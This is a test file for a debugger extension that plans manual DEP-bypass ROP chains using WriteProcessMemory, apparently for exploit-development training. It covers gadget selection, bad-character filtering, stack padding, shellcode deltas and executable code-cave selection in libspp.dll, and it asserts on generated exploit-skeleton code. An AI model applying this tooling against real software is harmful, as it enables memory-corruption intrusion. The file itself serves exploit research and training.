import { describe, expect, test } from "vitest";
import { calculateManualWpmValues, chooseBytesWrittenAddress, chooseManualWpmGadgets, renderManualWpmPlan, selectManualWpmCave, selectSafeIatAddress } from "../src/commands/dep_plan_manual";
import type { DecodedGadget } from "../src/core/backward_scanner";
import type { CodeCave } from "../src/commands/code_caves";
import { initializeScript, normalizeInvocation } from "../src/index";

function gadget(address: number, mnemonic: string, retImm = 0): DecodedGadget {
  return { address: BigInt(address), mnemonic, retImm, kind: "RET_CHAIN" };
}

describe("dep_plan_manual", () => {
  test("filters badchar addresses and marks missing gadgets", () => {
    const choices = chooseManualWpmGadgets([
      gadget(0x100a4242, "pop eax ; ret"),
      gadget(0x41424344, "pop ebp ; ret"),
    ], [0x0a]);
    const text = renderManualWpmPlan(choices, [0x0a]).join("\n");
    expect(text).toContain("GADGET_POP_EAX = None  # No direct GADGET, DO IT MANNUALLY");
    expect(text).toContain("GADGET_POP_EBP = 0x41424344");
  });

  test("places extra-pop values and RETN padding at the correct stack positions", () => {
    const choices = chooseManualWpmGadgets([
      gadget(0x41424344, "mov eax, esi ; pop esi ; ret 0x4", 4),
      gadget(0x41424348, "pop ebp ; ret"),
    ], []);
    const text = renderManualWpmPlan(choices, []).join("\n");
    expect(text).toContain("Optional Gadget: mov eax, esi ; pop esi ; ret 0x4");
    expect(text).toContain(
      'rop += pack("<L", GADGET_MOV_EAX_ESI)\n    rop += b"\\x41" * 4  # extra pop esi\n    rop += pack("<L", GADGET_POP_EBP)\n    rop += b"\\x41" * 4  # retn 0x4 skips these bytes\n    rop += pack("<L", eip_delta & 0xFFFFFFFF)',
    );
  });

  test("prefers a direct gadget and rejects RETN after the ESP pivot", () => {
    const choices = chooseManualWpmGadgets([
      gadget(0x41424344, "pop eax ; pop esi ; ret 0x4", 4),
      gadget(0x41424348, "pop eax ; ret"),
      gadget(0x4142434c, "xchg eax, esp ; ret 0x4", 4),
      gadget(0x41424350, "xchg eax, esp ; pop ebx ; ret"),
      gadget(0x41424354, "mov dword [edx], eax ; pop edx ; ret"),
    ], []);
    expect(choices.POP_EAX?.gadget.address).toBe(0x41424348n);
    expect(choices.XCHG_EAX_ESP).toBeUndefined();
    expect(choices.MOV_PTR_EDX_EAX).toBeUndefined();
  });

  test("flags extra arithmetic on dead registers and rejects changes to live registers", () => {
    const extra = gadget(0x41424344, "add eax, ebp ; dec ecx ; ret");
    const unsafe = gadget(0x41424348, "add eax, ebp ; dec eax ; ret");
    const choices = chooseManualWpmGadgets([extra, unsafe], []);
    expect(choices.ADD_EAX_EBP?.gadget.address).toBe(extra.address);
    const text = renderManualWpmPlan(choices, []).join("\n");
    expect(text).toContain("# NEED TO BE CHECKED, ROP PERFORMS MORE TASKS: add eax, ebp ; dec ecx ; ret");
    expect(text).toContain("# 4.2.2.1: Recheck negative_shellcode_delta after generating the shellcode or decoder");
    const direct = gadget(0x4142434c, "add eax, ebp ; ret");
    expect(chooseManualWpmGadgets([extra, direct], []).ADD_EAX_EBP?.gadget.address).toBe(direct.address);
  });

  test("accepts the requested positional dx invocation", () => {
    const logs: string[] = [];
    (globalThis as unknown as { host: unknown }).host = {
      diagnostics: { debugLog: (line: string) => logs.push(line) },
      currentProcess: { Is64Bit: false, Modules: [] },
    };
    initializeScript();
    const api = (globalThis as unknown as { osed: Record<string, (...args: unknown[]) => unknown> }).osed;
    expect(normalizeInvocation("dep_plan_manual", ["WPM", "", "00 0A 0D 25 26 2B 3D"]))
      .toEqual({ method: "WPM", module: "", badchars: "00 0A 0D 25 26 2B 3D", shellcode: undefined, frame: undefined, minCaveSize: undefined });
    expect(api.dep_plan_manual("WPM", "", "00 0A 0D 25 26 2B 3D")).toMatchObject({ success: true });
    expect(logs.join("")).toContain("GADGET_POP_EAX = None  # No direct GADGET");
    expect(api.last_result()).toMatchObject({ command: "dep_plan_manual", success: true });
  });

  test("pads either the decoder's first address or the next gadget after repeated RETN", () => {
    const choices = chooseManualWpmGadgets([
      gadget(0x41424344, "inc edx ; ret 0x8", 8),
      gadget(0x41424348, "pop eax ; ret"),
    ], []);
    const text = renderManualWpmPlan(choices, []).join("\n");
    expect(text).toContain('rop += restoreRop[:4] + b"\\x41" * 8 + restoreRop[4:]');
    expect(text).toContain('if not restoreRop: rop += b"\\x41" * 8  # preceding retn with no decoder');
  });

  test("calculates live deltas and prints the six skeleton steps", () => {
    const values = calculateManualWpmValues({ esp: 0x10003000, frame: 0x10002fdc, shellcode: 0x10003100, wpmOffset: 0xfffe2930, iat: 0x10168040 });
    expect(values).toEqual({ eipDelta: 0xffffffdc, negativeWpmOffset: 0xfffe2930, iatAddress: 0x10168040, negativeShellcodeDelta: 0xfffffeec, bytesWritten: undefined });
    const lines = renderManualWpmPlan(chooseManualWpmGadgets([], []), [], values);
    expect(lines.filter((line) => /^    # [1-6]\. /.test(line))).toHaveLength(6);
    expect(lines.join("\n")).toContain("eip_delta = 0xFFFFFFDC");
    expect(lines.join("\n")).toContain("iat_address = 0x10168040");
  });

  test("reads the current ESP, frame marker, shellcode bytes and symbol offset", () => {
    const logs: string[] = [];
    const memory = new Map<number, number>();
    [0x45, 0x45, 0x45, 0x45].forEach((byte, i) => memory.set(0x10002fdc + i, byte));
    [0x89, 0xe5, 0x81, 0xc4, 0xf0, 0xf9].forEach((byte, i) => memory.set(0x10003100 + i, byte));
    (globalThis as unknown as { host: unknown }).host = {
      diagnostics: { debugLog: (line: string) => logs.push(line) },
      currentProcess: { Is64Bit: false, Modules: [] },
      currentThread: { Registers: { User: { esp: 0x10003000 } } },
      memory: { readMemoryValues: (address: number | bigint, length: number) =>
        Array.from({ length }, (_, i) => memory.get(Number(address) + i) ?? 0) },
      namespace: { Debugger: { Utility: { Control: { ExecuteCommand: () =>
        ["Evaluate expression: -120528 = fffe2930"] } } } },
    };
    initializeScript();
    const api = (globalThis as unknown as { osed: Record<string, (...args: unknown[]) => unknown> }).osed;
    expect(api.dep_plan_manual("WPM", "", "00 0A 0D", "89 E5 81 C4 F0 F9"))
      .toMatchObject({ success: true });
    const output = logs.join("");
    expect(output).toContain("eip_delta = 0xFFFFFFDC");
    expect(output).toContain("negative_wpm_offset = 0xFFFE2930");
    expect(output).toContain("negative_shellcode_delta = 0xFFFFFEEC");
  });

  test("uses the .data end plus four only when the DWORD is verified usable", () => {
    const section = { module: { name: "libspp", path: "libspp.dll", base: BigInt(0x10000000), size: BigInt(0x300000) }, name: ".data", start: BigInt(0x101d5000), size: 0x37040, executable: false };
    expect(chooseBytesWrittenAddress([section], [0x44], () => true)).toBeUndefined();
    expect(chooseBytesWrittenAddress([section], [], (address) => address === BigInt(0x1020c044))).toBe(0x1020c044);
    expect(chooseBytesWrittenAddress([section], [], () => false)).toBeUndefined();
    const next = { ...section, name: ".rdata", start: BigInt(0x1020c040), size: 0x1000 };
    expect(chooseBytesWrittenAddress([section, next], [], () => true)).toBeUndefined();
    const text = renderManualWpmPlan(chooseManualWpmGadgets([], []), [], { bytesWritten: 0x1020c044 }).join("\n");
    expect(text).toContain("def GetWriteProcessMemoryTemplate() -> bytes:");
    expect(text).toContain("lpNumberOfBytesWritten = 0x1020C044");
  });

  test("filters IAT addresses and checks every generated payload byte", () => {
    expect(selectSafeIatAddress([0x100a4242], [0x0a])).toBeUndefined();
    expect(selectSafeIatAddress([0x100a4242, 0x41424344], [0x0a])).toBe(0x41424344);
    expect(selectSafeIatAddress([0x41424344, 0x41424348], [0x0a])).toBeUndefined();
    const text = renderManualWpmPlan(chooseManualWpmGadgets([], []), [0x00, 0x0a]).join("\n");
    expect(text).toContain('badchars = bytes.fromhex("00 0a")');
    expect(text).toContain("if any(byte in badchars for byte in wpm): raise ValueError");
    expect(text).toContain("if any(byte in badchars for byte in rop): raise ValueError");
  });

  test("selects the reported PAGE_EXECUTE_READ cave with clean address and boundary margin", () => {
    const cave = { address: 0x10167018n, size: 0xfe8, module: "libspp.dll", section: ".text", executable: true } as CodeCave;
    const badchars = [0x00, 0x0a, 0x0d, 0x25, 0x26, 0x2b, 0x3d];
    expect(selectManualWpmCave([cave], 0x210, badchars, () => false)).toBeUndefined();
    const selected = selectManualWpmCave([cave], 0x210, badchars, () => true);
    expect(selected).toEqual({ address: 0x1016701c, size: 0xfe0, source: "libspp.dll .text PAGE_EXECUTE_READ; address bytes 1C 70 16 10" });
    expect(selectManualWpmCave([cave], 0xfe1, badchars, () => true)).toBeUndefined();
    expect(selectManualWpmCave([{ ...cave, executable: false }], 0x210, badchars, () => true)).toBeUndefined();
    expect(selectManualWpmCave([cave], 0x210, [...badchars, 0x1c], () => true)?.address).toBe(0x1016701d);
    const text = renderManualWpmPlan(chooseManualWpmGadgets([], []), badchars, { codeCave: selected?.address, codeCaveSize: selected?.size, codeCaveSource: selected?.source }).join("\n");
    expect(text).toContain("codeCaveAd = 0x1016701C  # auto: libspp.dll .text PAGE_EXECUTE_READ; address bytes 1C 70 16 10");
    expect(text).toContain("if codeCaveSize is not None and shellcode_size > codeCaveSize");
  });
});
